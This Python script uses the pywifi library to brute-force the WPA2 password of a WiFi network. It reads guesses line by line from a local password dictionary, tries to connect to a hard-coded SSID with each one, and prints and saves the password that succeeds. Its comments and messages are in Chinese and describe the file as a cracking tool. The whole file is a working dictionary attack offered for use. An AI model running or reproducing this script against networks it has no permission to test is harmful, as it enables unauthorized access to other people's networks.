import pywifi
from pywifi import const
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()# 断开连接
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()# 创建WiFi连接文件
        profile.ssid = wifiname# WiFi的ssid，即wifi的名称
        profile.key = wifipassword# WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk
        profile.auth = const.AUTH_ALG_OPEN # 开放网卡
        profile.cipher = const.CIPHER_TYPE_CCMP# 加密单元
        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件
        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件
        ifaces.connect(tep_profile) # 连接WiFi
        time.sleep(1.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
def main():
    print('开始破解：')
    file = open('G:\myweb\pythondemo\pwd.txt','r')#打开密码本 要爆破字典
    # wifi_name=input('请输入所要破解的wifi的名字（请务必注意大小写）：')
    wifi_name = "12345"
    while True:
        wifipwd = file.readline()
        try:
            bool = wifiConnect(wifi_name,wifipwd)
            if bool:
                print('正确密码为：'+wifipwd)
                fo=open('G:\myweb\pythondemo/%s.txt'%wifi_name,'w')
                fo.write('该wifi的密码为：')
                fo.write(wifipwd)
                fo.close()
                return

            else:
               print('本次尝试的密码为：%s，状态：密码错误'%wifipwd)
        except:
            continue
    file.close()
if __name__=='__main__':
	main()